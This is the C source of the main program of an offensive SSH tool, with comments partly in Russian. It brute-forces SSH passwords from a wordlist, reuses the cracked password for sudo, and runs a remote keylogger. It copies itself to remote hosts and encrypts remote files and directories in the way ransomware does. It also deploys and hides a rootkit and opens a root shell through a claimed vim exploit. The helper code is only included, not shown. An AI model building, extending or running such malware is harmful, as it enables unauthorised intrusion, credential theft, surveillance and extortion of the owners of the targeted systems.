#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <limits.h>

#include <openssl/evp.h>
#include <openssl/err.h>

#include "ssh_utils.h"
#include "rsa_crypto.h"
#include "keylogger.h"
#include "rootkit.h"
#include "vim_exploit.h"
#include "persistence.h"
#include "utils.h"

// Глобальные переменные
rsa_keys_t global_rsa_keys = {0};

// ==================== Main Function ====================

int main(int argc, char *argv[]) {
    if (argc < 3) {
        printf("Enhanced SSH Tool with RSA-4096 Encryption, Remote Keylogger, Rootkit Deployment, and VIM Root Exploit\n");
        printf("Usage: %s <target> <username> [options]\n", argv[0]);
        printf("Options:\n");
        printf("  -p <port>       SSH port (default: 22)\n");
        printf("  -P <file>       Password file for brute force\n");
        printf("  -i              Interactive shell\n");
        printf("  -u <loc> <rem>  Upload local file to remote path\n");
        printf("  -K              Start remote keylogger\n");
        printf("  -S              Stop remote keylogger\n");
        printf("  -G <path>       Download keylogs to local path\n");
        printf("  -R [path]       Replicate self to remote host\n");
        printf("  -ef <file>      Encrypt remote file with RSA-4096\n");
        printf("  -df <file>      Decrypt remote file with RSA-4096\n");
        printf("  -ed <dir>       Encrypt remote directory with RSA-4096\n");
        printf("  -dd <dir>       Decrypt remote directory with RSA-4096\n");
        printf("  -genkey <pub> <priv> Generate RSA-4096 key pair\n");
        printf("  -deploy-rootkit-vim Deploy rootkit using vim exploit\n");
        printf("  -load-rootkit-vim-exploit <path> Load rootkit using vim exploit with auto-close\n");
        printf("  -hide-module-vim Hide rootkit module using vim exploit\n");
        printf("  -show-module-vim Show rootkit module using vim exploit\n");
        printf("  -hide-pid-vim <pid> Hide process using vim exploit\n");
        printf("  -show-pid-vim <pid> Show process using vim exploit\n");
        printf("  -vim-root       Interactive root shell via vim exploit\n");
        return 1;
    }

    if (argc >= 4 && strcmp(argv[1], "-genkey") == 0) {
        if (generate_rsa_key_pair(argv[2], argv[3])) {
            printf("[+] RSA-4096 key pair generated successfully\n");
            printf("    Public key: %s\n", argv[2]);
            printf("    Private key: %s\n", argv[3]);
        } else {
            fprintf(stderr, "[-] Failed to generate RSA key pair\n");
        }
        return 0;
    }

    const char *target = argv[1];
    const char *username = argv[2];
    int port = 22;
    const char *password_file = NULL;
    int interactive = 0;
    const char *local_path = NULL;
    const char *remote_path = NULL;
    int start_keylog = 0, stop_keylog = 0;
    const char *download_logs_path = NULL;
    int replicate_self = 0;
    const char *replicate_path = NULL;
    const char *encrypt_remote_file_path = NULL;
    const char *decrypt_remote_file_path = NULL;
    const char *encrypt_remote_dir_path = NULL;
    const char *decrypt_remote_dir_path = NULL;
    int deploy_rt_vim = 0;
    const char *load_remote_rootkit_path = NULL;
    int load_rootkit_vim_exploit = 0;
    const char *rootkit_vim_path = NULL;
    int hide_module_vim = 0;
    int show_module_vim = 0;
    int get_root = 0;
    int show_pid_vim = 0;
    int hide_pid_vim = 0;
    int pid_to_show_vim = 0;
    int pid_to_hide_vim = 0;
    int vim_root_shell = 0;

    for (int i = 3; i < argc; i++) {
        if (strcmp(argv[i], "-p") == 0 && i+1 < argc) {
            port = atoi(argv[++i]);
        } else if (strcmp(argv[i], "-P") == 0 && i+1 < argc) {
            password_file = argv[++i];
            set_global_password(password_file);
        } else if (strcmp(argv[i], "-i") == 0) {
            interactive = 1;
        } else if (strcmp(argv[i], "-u") == 0 && i+2 < argc) {
            local_path = argv[++i];
            remote_path = argv[++i];
        } else if (strcmp(argv[i], "-K") == 0) {
            start_keylog = 1;
        } else if (strcmp(argv[i], "-S") == 0) {
            stop_keylog = 1;
        } else if (strcmp(argv[i], "-G") == 0 && i+1 < argc) {
            download_logs_path = argv[++i];
        } else if (strcmp(argv[i], "-R") == 0) {
            replicate_self = 1;
            if (i+1 < argc && argv[i+1][0] != '-') {
                replicate_path = argv[++i];
            }
        } else if (strcmp(argv[i], "-ef") == 0 && i+1 < argc) {
            encrypt_remote_file_path = argv[++i];
        } else if (strcmp(argv[i], "-df") == 0 && i+1 < argc) {
            decrypt_remote_file_path = argv[++i];
        } else if (strcmp(argv[i], "-ed") == 0 && i+1 < argc) {
            encrypt_remote_dir_path = argv[++i];
        } else if (strcmp(argv[i], "-dd") == 0 && i+1 < argc) {
            decrypt_remote_dir_path = argv[++i];
        } else if (strcmp(argv[i], "-deploy-rootkit-vim") == 0) {
            deploy_rt_vim = 1;
        } else if (strcmp(argv[i], "-load-rootkit-vim-exploit") == 0 && i+1 < argc) {
            load_rootkit_vim_exploit = 1;
            rootkit_vim_path = argv[++i];
        } else if (strcmp(argv[i], "-hide-module-vim") == 0) {
            hide_module_vim = 1;
        } else if (strcmp(argv[i], "-show-module-vim") == 0) {
            show_module_vim = 1;
        } else if (strcmp(argv[i], "-hide-pid-vim") == 0 && i+1 < argc) {
            hide_pid_vim = 1;
            pid_to_hide_vim = atoi(argv[++i]);
        } else if (strcmp(argv[i], "-show-pid-vim") == 0 && i+1 < argc) {
            show_pid_vim = 1;
            pid_to_show_vim = atoi(argv[++i]);
        } else if (strcmp(argv[i], "-vim-root") == 0) {
            vim_root_shell = 1;
        } 
    }
    
    ssh_session session = ssh_new();
    if (!session) {
        fprintf(stderr, "Error creating SSH session\n");
        return 1;
    }

    ssh_options_set(session, SSH_OPTIONS_HOST, target);
    ssh_options_set(session, SSH_OPTIONS_PORT, &port);
    ssh_options_set(session, SSH_OPTIONS_USER, username);

    printf("[*] Connecting to %s:%d as %s...\n", target, port, username);
    if (ssh_connect(session) != SSH_OK) {
        fprintf(stderr, "Error connecting to %s: %s\n", target, ssh_get_error(session));
        ssh_free(session);
        return 1;
    }
    printf("[+] Connected to %s\n", target);
    
    if (password_file) {
        FILE *pf = fopen(password_file, "r");
        if (!pf) {
            fprintf(stderr, "Can't open password file %s\n", password_file);
            ssh_disconnect(session);
            ssh_free(session);
            return 1;
        }

        char password[256];
        int authenticated = 0;
        char *successful_password = NULL;
        
        printf("[*] Starting password brute force from %s\n", password_file);
        while (fgets(password, sizeof(password), pf)) {
            password[strcspn(password, "\n")] = 0;
            
            printf("[*] Trying password: %s\n", password);
            if (ssh_userauth_password(session, NULL, password) == SSH_AUTH_SUCCESS) {
                printf("[+] Authenticated with password: %s\n", password);
                authenticated = 1;
                successful_password = strdup(password); // Сохраняем успешный пароль
                break;
            }
        }
        
        fclose(pf);
        
        if (authenticated && successful_password) {
            // Устанавливаем глобальный пароль
            if (global_password) {
                free(global_password);
            }
            global_password = successful_password;
            printf("[+] Global password set for sudo: %s\n", global_password);
        } else {
            fprintf(stderr, "[-] Failed to authenticate with any password\n");
            ssh_disconnect(session);
            ssh_free(session);
            return 1;
        }
    }
    
    printf("[+] SSH connection established to %s\n", target);

    keylogger_data_t keylogger_data = {0};
    
    printf("[*] Authentication completed\n");
    if (global_password) {
        printf("[+] Global password is set: %s\n", global_password);
    } else {
        printf("[-] Global password is NOT set\n");
    }

    // Тестируем sudo доступ
    printf("[*] Testing sudo access with global password...\n");
    ssh_channel test_channel = ssh_channel_new(session);
    if (test_channel && ssh_channel_open_session(test_channel) == SSH_OK) {
        char test_cmd[512];
        snprintf(test_cmd, sizeof(test_cmd),
            "echo '%s' | sudo -S whoami 2>&1",
            global_password ? global_password : "");
        
        if (ssh_channel_request_exec(test_channel, test_cmd) == SSH_OK) {
            char buffer[256];
            int nbytes = ssh_channel_read(test_channel, buffer, sizeof(buffer) - 1, 0);
            if (nbytes > 0) {
                buffer[nbytes] = '\0';
                printf("Sudo test result: %s", buffer);
            }
        }
        ssh_channel_close(test_channel);
        ssh_channel_free(test_channel);
    }
    
    if (encrypt_remote_file_path || decrypt_remote_file_path || 
        encrypt_remote_dir_path || decrypt_remote_dir_path || 
        start_keylog) {
        if (!initialize_rsa_keys(&global_rsa_keys)) {
            fprintf(stderr, "Failed to initialize global RSA keys\n");
            cleanup_ssh_session(session);
            return 1;
        }
        printf("[+] RSA-4096 keys initialized\n");
    }
    
    if (replicate_self) {
        printf("[*] Attempting self-replication...\n");
        if (is_already_running(MARKER_FILE)) {
            printf("[!] Already running on remote system\n");
        } else {
            printf("[+] Copying binary to remote host...\n");
            copy_self_to_remote(session, replicate_path);
        }
    }
    
    if (deploy_rt_vim) {
        printf("[*] Deploying rootkit using vim exploit...\n");
        if (deploy_rootkit_with_vim(session) == 0) {
            printf("[+] Rootkit deployed successfully\n");
            
            // Дополнительная проверка
            printf("[*] Performing final verification...\n");
            verify_rootkit_loaded(session);
        } else {
            fprintf(stderr, "[-] Failed to deploy rootkit\n");
        }
    }
    
    if (load_rootkit_vim_exploit && rootkit_vim_path) {
        printf("[*] Loading rootkit via vim exploit with auto-password: %s\n", rootkit_vim_path);
        
        if (load_rootkit_via_vim_exploit_auto_password(session, rootkit_vim_path) == 0) {
            printf("[+] Rootkit loaded successfully via vim exploit with auto-password\n");
        }
        else if (load_rootkit_via_vim_no_sudo(session, rootkit_vim_path) == 0) {
            printf("[+] Rootkit loaded successfully via vim script method with auto-password\n");
        }
        else {
            fprintf(stderr, "[-] All vim exploit methods with auto-password failed\n");
        }
    }
    
    if (hide_module_vim) {
        printf("[*] Hiding rootkit module using vim exploit with auto-password...\n");
        hide_module_with_vim_auto_password(session);
    }
    
    if (show_module_vim) {
        printf("[*] Showing rootkit module using vim exploit...\n");
        show_module_with_vim_auto_password(session);
    }
    
    if (hide_pid_vim) {
        printf("[*] Hiding process %d using vim exploit with auto-password...\n", pid_to_hide_vim);
        hide_pid_with_vim_auto_password(session, pid_to_hide_vim);
    }
    
    if (show_pid_vim) {
        printf("[*] Hiding process %d using vim exploit with auto-password...\n", pid_to_hide_vim);
        show_pid_with_vim_auto_password(session, pid_to_hide_vim);
    }
    
    if (encrypt_remote_file_path) {
        printf("[*] Encrypting remote file with RSA-4096: %s\n", encrypt_remote_file_path);
        encrypt_remote_file(session, encrypt_remote_file_path);
    }
    
    if (decrypt_remote_file_path) {
        printf("[*] Decrypting remote file with RSA-4096: %s\n", decrypt_remote_file_path);
        decrypt_remote_file(session, decrypt_remote_file_path);
    }
    
    if (encrypt_remote_dir_path) {
        printf("[*] Encrypting remote directory with RSA-4096: %s\n", encrypt_remote_dir_path);
        encrypt_remote_directory(session, encrypt_remote_dir_path);
    }
    
    if (decrypt_remote_dir_path) {
        printf("[*] Decrypting remote directory with RSA-4096: %s\n", decrypt_remote_dir_path);
        decrypt_remote_directory(session, decrypt_remote_dir_path);
    }
    
    if (start_keylog) {
        printf("[*] Starting remote keylogger...\n");
        start_remote_keylogger(&keylogger_data, session, "/tmp/.keylog");
    }
    
    if (stop_keylog) {
        printf("[*] Stopping remote keylogger...\n");
        stop_remote_keylogger(&keylogger_data);
    }
    
    if (download_logs_path) {
        printf("[*] Downloading keylogger logs to %s...\n", download_logs_path);
        if (!keylogger_data.session) {
            keylogger_data.session = session;
            strncpy(keylogger_data.logfile, "/tmp/.keylog", sizeof(keylogger_data.logfile) - 1);
            keylogger_data.logfile[sizeof(keylogger_data.logfile) - 1] = '\0';
        }
        
        if (download_keylogs(&keylogger_data, download_logs_path) != 0) {
            fprintf(stderr, "[-] Failed to download keylogger logs\n");
        }
    }
    
    if (local_path && remote_path) {
        printf("[*] Uploading %s to %s...\n", local_path, remote_path);
        upload_file(session, local_path, remote_path);
    }
    
    if (vim_root_shell) {
        printf("[*] Starting interactive root shell via vim exploit with auto-password...\n");
        interactive_vim_root_shell_auto_password(session);
    }

    if (interactive) {
        printf("[*] Starting interactive shell...\n");
        interactive_shell(session);
    }

    printf("[*] Disconnecting from %s...\n", target);
    cleanup_ssh_session(session);
    cleanup_rsa_keys(&global_rsa_keys);
    cleanup_password();

    printf("[+] Session closed\n");

    return 0;
}
